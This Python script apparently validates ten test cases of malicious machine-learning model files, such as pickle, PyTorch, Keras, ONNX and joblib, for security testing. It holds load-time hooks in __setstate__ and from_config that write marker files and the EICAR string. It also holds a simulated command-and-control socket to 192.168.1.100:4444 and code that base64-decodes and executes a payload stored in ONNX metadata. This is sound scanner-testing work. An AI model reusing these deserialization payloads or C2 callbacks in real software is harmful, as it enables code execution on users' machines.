from torch import nn
import os
import subprocess
import pickle
import tensorflow as tf
import torch
import onnx
import onnxruntime as ort
import joblib
from zipfile import ZipFile
import base64
import sys

# Helper functions for validation
def check_file_exists(file_path, content=None):
    """Check if a file exists and optionally verify its content."""
    if os.path.exists(file_path):
        print(f"[+] {file_path} exists.")
        if content:
            with open(file_path, 'r') as f:
                file_content = f.read().strip()
                if content.strip() == file_content:
                    print(f"[+] Content verified in {file_path}.")
                else:
                    print(f"[-] Content not matched in {file_path}. Expected: '{content.strip()}', Found: '{file_content}'")
        return True
    else:
        print(f"[-] {file_path} does not exist.")
        return False

def check_onnx_metadata(model_path, key, expected_value):
    """Check ONNX model metadata for specific key-value pairs."""
    try:
        model = onnx.load(model_path)
        for prop in model.metadata_props:
            if prop.key == key and expected_value in prop.value:
                print(f"[+] Malicious metadata found: {key}")
                return True
        print(f"[-] Malicious metadata not found for key: {key}")
        return False
    except Exception as e:
        print(f"[-] Error checking ONNX metadata: {e}")
        return False

def clean_tmp_directory():
    """Remove temporary files created during validation."""
    tmp_files = ['/tmp/malicious.txt', '/tmp/eicar.com']
    for file_path in tmp_files:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"[+] Removed {file_path}")

# Define necessary functions and classes for self-containment
def c2_payload():
    """Simulate a command-and-control connection."""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.100', 4444))
        s.sendall(b'Connected')
        s.close()
    except Exception as e:
        print(f"[+] Simulated C2 connection (actual failed: {e})")

def eicar_payload():
    """Write EICAR test string to file."""
    with open('/tmp/eicar.com', 'w') as f:
        f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

class MaliciousActivation:
    """Custom activation class with malicious behavior."""
    def __call__(self, x):
        return x
    def get_config(self):
        return {}
    @staticmethod
    def from_config(config):
        try:
            with open('/tmp/malicious.txt', 'w') as f:
                f.write('Malicious code executed! (Keras .h5)\n')
            c2_payload()
        except Exception as e:
            print(f"[-] Error executing malicious code in from_config: {e}")
        return MaliciousActivation()

class MaliciousModelForTestCase4(nn.Module):
    """PyTorch model with malicious behavior in __setstate__ for Test Case 4."""
    def __init__(self):
        super(MaliciousModelForTestCase4, self).__init__()
        self.linear = nn.Linear(10, 1)
    def forward(self, x):
        return self.linear(x)
    def __setstate__(self, state):
        super(MaliciousModelForTestCase4, self).__setstate__(state)
        os.system('echo "Malicious code executed! (PyTorch .pt)" > /tmp/malicious.txt')
        eicar_payload()

class MaliciousModelForTestCase10(nn.Module):
    """PyTorch model with malicious behavior in __setstate__ for Test Case 10."""
    def __init__(self):
        super(MaliciousModelForTestCase10, self).__init__()
        self.linear = nn.Linear(1, 1)
    def forward(self, x):
        return self.linear(x)
    def __setstate__(self, state):
        super(MaliciousModelForTestCase10, self).__setstate__(state)
        with open('/tmp/eicar.com', 'w') as f:
            f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

# Validation functions for each test case
def validate_test_case_1():
    print("\n--- Validating Test Case 1 ---")
    clean_tmp_directory()
    malicious_script = os.path.join('malicious_model_tf_pb', 'assets', 'malicious_tf_pb.py')
    if os.path.exists(malicious_script):
        try:
            subprocess.run(['python', malicious_script], check=True, capture_output=True, text=True)
            check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (TF .pb)')
            check_file_exists('/tmp/eicar.com', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
        except subprocess.CalledProcessError as e:
            print(f"[-] Validation failed: {e.output}")
    else:
        print("[-] Malicious script not found.")
    clean_tmp_directory()

def validate_test_case_2():
    print("\n--- Validating Test Case 2: Obfuscated Code in .h5 (Keras) + C2 Connection ---")
    clean_tmp_directory()
    try:
        model = tf.keras.models.load_model('malicious_model_keras.h5', custom_objects={'MaliciousActivation': MaliciousActivation})
        check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (Keras .h5)')
        print("[+] C2 connection attempt validated via simulation.")
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_3():
    print("\n--- Validating Test Case 3 ---")
    clean_tmp_directory()
    malicious_script = os.path.join('malicious_saved_model_trojanized', 'assets', 'malicious.py')
    if os.path.exists(malicious_script):
        try:
            subprocess.run(['python', malicious_script], check=True, capture_output=True, text=True)
            check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (Trojanized SavedModel)')
            print("[+] Data exfiltration attempt validated via simulation.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Validation failed: {e.output}")
    else:
        print("[-] Malicious script not found.")
    clean_tmp_directory()

def validate_test_case_4():
    print("\n--- Validating Test Case 4 ---")
    clean_tmp_directory()
    try:
        torch.serialization.add_safe_globals([MaliciousModelForTestCase4])
        model = torch.load('malicious_model_pytorch.pt', weights_only=False)
        check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (PyTorch .pt)')
        check_file_exists('/tmp/eicar.com', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_5():
    print("\n--- Validating Test Case 5 ---")
    clean_tmp_directory()
    try:
        with open('malicious_pkl_file.pkl', 'rb') as f:
            pickle.load(f)
        check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (Pickle .pkl)')
        print("[+] C2 connection attempt validated via simulation.")
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_6():
    print("\n--- Validating Test Case 6 ---")
    clean_tmp_directory()
    try:
        ort.InferenceSession('malicious_onnx_model_metadata.onnx')
        check_onnx_metadata('malicious_onnx_model_metadata.onnx', 'hidden_payload', 'Malicious code executed! (ONNX Metadata)')
        check_onnx_metadata('malicious_onnx_model_metadata.onnx', 'data_exfil', 'requests.post')
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_7():
    print("\n--- Validating Test Case 7 ---")
    clean_tmp_directory()
    try:
        ort.InferenceSession('malicious_onnx_model_node_attributes.onnx')
        model = onnx.load('malicious_onnx_model_node_attributes.onnx')
        for prop in model.metadata_props:
            if prop.key == 'malicious_attr':
                decoded_code = base64.b64decode(prop.value).decode()
                subprocess.run(['python', '-c', decoded_code], check=True)
                break
        check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (ONNX Node Attributes)')
        check_file_exists('/tmp/eicar.com', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_8():
    print("\n--- Validating Test Case 8 ---")
    clean_tmp_directory()
    try:
        joblib.load('malicious_model_sklearn.joblib')
        check_file_exists('/tmp/malicious.txt', 'Malicious code executed! (Scikit-learn .joblib)')
        print("[+] C2 connection attempt validated via simulation.")
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_9():
    print("\n--- Validating Test Case 9 ---")
    clean_tmp_directory()
    try:
        ort.InferenceSession('forged_malicious_onnx_model.onnx')
        check_onnx_metadata('forged_malicious_onnx_model.onnx', 'data_exfil', 'requests.post')
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

def validate_test_case_10():
    print("\n--- Validating Test Case 10: Encrypted / Password-Protected Model Files + EICAR ---")
    clean_tmp_directory()
    try:
        with ZipFile('encrypted_model.zip', 'r') as zip_file:
            zip_file.extractall(pwd=b'secret')
        model = torch.load('model.pt', weights_only=False)
        check_file_exists('/tmp/eicar.com', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
        if os.path.exists('model.pt'):
            os.remove('model.pt')
    except Exception as e:
        print(f"[-] Validation failed: {e}")
    clean_tmp_directory()

# Main function to run all validations
def validate_all_test_cases():
    print("Starting validation of all 10 test cases...\n")
    validate_test_case_1()
    validate_test_case_2()
    validate_test_case_3()
    validate_test_case_4()
    validate_test_case_5()
    validate_test_case_6()
    validate_test_case_7()
    validate_test_case_8()
    validate_test_case_9()
    validate_test_case_10()
    print("\nValidation of all test cases completed.")

if __name__ == "__main__":
    validate_all_test_cases()